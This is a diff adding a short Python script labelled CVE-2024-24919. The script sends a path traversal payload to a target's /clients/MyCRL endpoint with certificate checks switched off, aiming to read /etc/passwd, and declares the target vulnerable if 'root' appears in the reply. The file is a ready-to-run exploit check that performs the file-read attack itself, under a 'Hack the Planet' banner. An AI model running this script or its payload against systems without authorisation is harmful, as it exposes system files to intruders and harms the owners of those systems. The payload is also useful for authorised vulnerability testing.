@@ -1,0 +1,47 @@
+import requests
+import argparse
+import sys
+import urllib3
+
+urllib3.disable_warnings((urllib3.exceptions.InsecureRequestWarning))
+
+def ascii():
+    art = print("""   _  _         _     _   _          ___ _       
+ | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ 
+ | __ / _` / _| / / |  _| ' \/ -_) |  _/ / _` | ' \/ -_)  _|
+ |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|
+""")
+    return art 
+
+def scan(targetIP):
+    
+    finalUrl = f"https://{targetIP}/clients/MyCRL"
+    
+    data = f"aCSHELL/../../../../../../../../../../../../../../../../../etc/passwd"
+    
+    # Make the POST request
+    print("\033[92m[+] Checking the target \033[0m")
+    response = requests.post(finalUrl, data=data, verify=False)
+    
+    # Check if the request was successful
+    if response.status_code == 200:
+        if 'root' in response.text:
+            print("\033[92mTarget is vulnerable!! \033[0m")
+            
+    else:
+        print("\033[91mTarget might not be vulnerable... \033[0m")
+        sys.exit("\033[91mExiting\033[0m")
+
+def main():
+    parser = argparse.ArgumentParser(description="CVE-2024-24919")
+    parser.add_argument("-i", '--targetIP', required=True, help="The target IP")
+    args = parser.parse_args()
+    try:
+        ascii()
+        return(scan(args.targetIP))
+            
+    except Exception as e:
+        sys.exit(f"Some error occured: {e}")
+        
+if __name__ == "__main__":
+    main()
